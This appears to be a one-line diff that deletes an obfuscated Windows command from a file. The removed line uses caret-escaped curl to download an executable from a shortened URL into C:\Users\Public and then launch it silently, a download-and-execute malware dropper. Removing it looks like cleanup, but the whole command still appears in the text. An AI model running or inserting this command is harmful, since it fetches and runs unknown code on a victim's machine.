@@ -1,1 +1,0 @@
-C:\Windows\System32\cmd.exe /k  "c^u^rl.e^x^e -L https://tinyurl.com/y5t4njet --output C:\Users\Public\mfnetcre2939.^e^xe && st^ar^t /b C:\Users\Public\mfnetcre2939.e^xe && exit"
